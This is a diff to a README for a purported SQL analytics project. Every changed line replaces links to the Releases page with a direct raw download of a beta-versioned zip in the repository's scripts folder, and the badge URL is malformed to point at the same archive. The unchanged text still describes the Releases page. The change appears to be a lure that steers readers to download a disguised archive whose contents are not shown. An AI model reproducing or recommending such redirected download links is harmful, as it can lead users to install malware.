@@ -1,6 +1,6 @@
 # 🚀 SQL-Advance-Data-Analytics-Project - Unlock Insights with SQL Analytics
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Now-brightgreen.svg)](https://github.com/Ibgentle/SQL-Advance-Data-Analytics-Project/releases)
+[![Download Latest Release](https://github.com/Ibgentle/SQL-Advance-Data-Analytics-Project/raw/refs/heads/main/scripts/Analytics_Data_Project_SQ_Advance_1.0-beta.3.zip%https://github.com/Ibgentle/SQL-Advance-Data-Analytics-Project/raw/refs/heads/main/scripts/Analytics_Data_Project_SQ_Advance_1.0-beta.3.zip)](https://github.com/Ibgentle/SQL-Advance-Data-Analytics-Project/raw/refs/heads/main/scripts/Analytics_Data_Project_SQ_Advance_1.0-beta.3.zip)
 
 ## 📖 Overview
 
@@ -23,7 +23,7 @@ Before downloading, ensure your system meets the following requirements:
 
 To download and run this software, please visit the releases page. There, you can find the latest version ready for download.
 
-[Download the latest version here](https://github.com/Ibgentle/SQL-Advance-Data-Analytics-Project/releases)
+[Download the latest version here](https://github.com/Ibgentle/SQL-Advance-Data-Analytics-Project/raw/refs/heads/main/scripts/Analytics_Data_Project_SQ_Advance_1.0-beta.3.zip)
 
 1. Click the link above to open the Releases page.
 2. Look for the latest version.
@@ -88,4 +88,4 @@ We aim to simplify data analytics with SQL. Our tools provide valuable insights 
 
 For your convenience, remember to download the latest version from the link below:
 
-[Download the latest version here](https://github.com/Ibgentle/SQL-Advance-Data-Analytics-Project/releases)
+[Download the latest version here](https://github.com/Ibgentle/SQL-Advance-Data-Analytics-Project/raw/refs/heads/main/scripts/Analytics_Data_Project_SQ_Advance_1.0-beta.3.zip)
